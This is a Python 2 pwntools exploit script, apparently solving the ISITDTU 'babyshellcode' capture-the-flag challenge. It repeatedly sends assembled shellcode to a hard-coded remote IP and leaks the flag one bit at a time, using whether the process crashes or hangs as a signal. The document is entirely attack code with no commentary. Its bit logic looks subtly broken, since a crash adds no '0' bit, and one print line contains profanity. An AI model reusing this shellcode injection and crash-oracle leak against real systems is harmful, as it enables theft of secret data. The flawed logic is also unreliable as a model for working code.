from pwn import *
import sys

shellcode = '''
mov rax , 0xcafe000
add rax , {0}
mov dl , byte ptr [rax]
xor dl , '{1}'

mov rax , 0xcafe000
add rax , {2}
mov al , byte ptr [rax]

xor dl , al
shr dl , {3}

and dl , 1

cmp dl , 0
jz _bad

_loop:
	jmp _loop

_bad:
'''

flag = ""
idx = len(flag) - 8
print "idx : " + str(idx)

while True:
	k = ""
	paa = 0
	while (paa < 8):
		#p = process("./babyshellcode",aslr=False)
		p = remote("209.97.162.170",2222)
		tmp = shellcode.format(idx % 8 ,"ISITDTU{"[idx % 8] , idx + 8 , paa)
		p.sendline(asm(tmp,arch="amd64"))
	
		zxc = p.recvuntil("Segmentation",timeout=2)
		print 'fuck : ' + zxc
		try:
			if( "Segmentation" in zxc):
				2
			else:
				k = "1" + k
		except:
			p.close()
			continue
		paa+=1
		p.close()
		print(k)
		
	flag += chr(int(k,2))
	print(flag)
	idx += 1
  
p.interactive()
